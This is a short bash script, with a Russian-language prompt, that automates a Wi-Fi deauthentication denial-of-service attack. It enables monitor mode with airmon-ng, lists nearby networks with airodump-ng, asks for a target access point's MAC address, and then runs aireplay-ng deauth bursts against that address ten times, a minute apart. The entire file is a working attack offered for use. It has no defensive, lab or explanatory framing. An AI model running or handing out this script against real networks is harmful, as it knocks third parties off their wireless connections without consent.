#! /bin/bash

sudo airmon-ng start wlan0
echo
sudo airodump-ng wlan0mon
echo

echo "Введите NAC адрес цели: "
read Mac

dos() {

    for i in {1..10}

    do
        sudo aireplay-ng --deauth 100 -a $Mac wlan0mon

        sleep 60s

    done
}

leave() {

    echo
    echo "--------------------"
    echo "Dos Attack Complate!"
    echo "--------------------"
    echo
}

dos
leave
